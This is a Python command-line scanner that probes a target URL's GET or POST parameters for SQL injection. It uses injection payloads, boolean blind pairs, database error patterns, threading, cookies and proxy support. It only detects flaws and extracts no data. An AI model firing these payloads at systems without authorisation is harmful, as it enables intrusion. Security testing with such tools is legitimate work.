import argparse
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import csv
import json
import time

# lists of necessary strings commonly used in sql injections, including the payloads, blind pairs, and error patterns
SQLI_PAYLOADS = [
    "'", '"', "' OR 1=1--", '" OR 1=1--', "';", '")',
    "' OR 'a'='a", "\" OR \"a\"=\"a",
    "'/**/OR/**/1=1--", "'+OR+1=1--", "'%2BOR%2B1%3D1--"
]

BLIND_PAIRS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ('" AND 1=1--', '" AND 1=2--'),
    ("' AND '1'='1", "' AND '1'='2"),
]

ERROR_PATTERNS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_", "Unclosed quotation mark",
    "quoted string not properly terminated",
    "near \"", "SQL syntax", "PDOException",
    "ODBC", "SQLException", "internal server error"
]

# function that parses through the url to inject whatever string is needed into the url using an http get request
def inject_get(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    injected = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', injected, ''))

# function that does the same thing as above, but does it using a post request
def inject_post(data, param, payload):
    query = parse_qs(data)
    query[param] = payload
    return urlencode(query, doseq=True)

# function that adds status code detection to ensure reliability in the scanner
def is_error(resp_text, status):
    if status >= 500:
        return True
    for pat in ERROR_PATTERNS:
        if pat.lower() in resp_text.lower():
            return True
    return False

# main function in which the scanning occurs using various parameters
def scan_param(method, url, param, headers, base_data, proxies, timeout, retries):
    results = []
    original_resp = None

    for attempt in range(retries):
        try:
            if method == "GET":
                original_resp = requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
            else:
                original_resp = requests.post(url, data=base_data, headers=headers, proxies=proxies, timeout=timeout)
            break
        except Exception:
            time.sleep(1)
    if not original_resp:
        return []

    for payload in SQLI_PAYLOADS:
        for attempt in range(retries):
            try:
                if method == "GET":
                    test_url = inject_get(url, param, payload)
                    resp = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout)
                else:
                    mod_data = inject_post(base_data, param, payload)
                    resp = requests.post(url, data=mod_data, headers=headers, proxies=proxies, timeout=timeout)

                if is_error(resp.text, resp.status_code):
                    results.append((param, payload, "Error-based"))
                    return results

                if abs(len(resp.text) - len(original_resp.text)) > 30:
                    results.append((param, payload, "Blind/Length-based"))
                    return results
            except Exception:
                continue

# this is a for loop that is the heart of the blind logic test
    for true_payload, false_payload in BLIND_PAIRS:
        try:
            if method == "GET":
                true_url = inject_get(url, param, true_payload)
                false_url = inject_get(url, param, false_payload)
                resp_true = requests.get(true_url, headers=headers, proxies=proxies, timeout=timeout)
                resp_false = requests.get(false_url, headers=headers, proxies=proxies, timeout=timeout)
            else:
                true_data = inject_post(base_data, param, true_payload)
                false_data = inject_post(base_data, param, false_payload)
                resp_true = requests.post(url, data=true_data, headers=headers, proxies=proxies, timeout=timeout)
                resp_false = requests.post(url, data=false_data, headers=headers, proxies=proxies, timeout=timeout)

            if abs(len(resp_true.text) - len(resp_false.text)) > 30:
                results.append((param, true_payload, "Blind/Boolean"))
                return results
        except Exception:
            continue

    return results

# function to output results into json or csv formats
def save_results(results, base_filename):
    with open(f"{base_filename}.csv", "w", newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["Parameter", "Payload", "Type"])
        writer.writerows(results)

    with open(f"{base_filename}.json", "w") as f:
        json.dump([{"param": r[0], "payload": r[1], "type": r[2]} for r in results], f, indent=2)

# function that detects cookies to add greater effectiveness for the scanner
def scan_sqli(args):
    headers = {}
    if args.cookie:
        headers['Cookie'] = args.cookie
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

    base_data = args.data if args.data else ""
    parsed_url = urlparse(args.url)

    if args.method == "GET":
        params = list(parse_qs(parsed_url.query).keys())
    else:
        params = list(parse_qs(base_data).keys())

    if not params:
        print("|x| No parameters to scan.")
        return

    print(f"|*| Scanning {args.url} using {args.method} for SQL injection...\n")

# threads used to concurrently automate the scanning process to make it much faster, run smoother, etc.
    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [
            executor.submit(scan_param, args.method, args.url, param, headers, base_data, proxies, args.timeout, args.retries)
            for param in tqdm(params, desc="Scanning parameters")
        ]
        for future in futures:
            res = future.result()
            if res:
                results.extend(res)

    if results:
        print(f"\n|+| Found {len(results)} potential vulnerabilities.")
        save_results(results, args.output)
        print(f"|*| Results saved to {args.output}.csv and {args.output}.json")
    else:
        print("|*| No SQLi vulnerabilities detected.")

# arg parser function for cli customizability
def cli():
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    parser.add_argument("url", help="Target URL (with parameters)")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    parser.add_argument("--data", help="POST data like 'id=1&user=admin'")
    parser.add_argument("--header", nargs="*", help="Custom headers (e.g. User-Agent:X)")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--proxy", help="Proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=8, help="Request timeout (seconds)")
    parser.add_argument("--retries", type=int, default=2, help="Retry attempts per request")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent threads")
    parser.add_argument("--output", default="sqli_results", help="Base output filename")

    args = parser.parse_args()
    scan_sqli(args)

if __name__ == "__main__":
    cli()
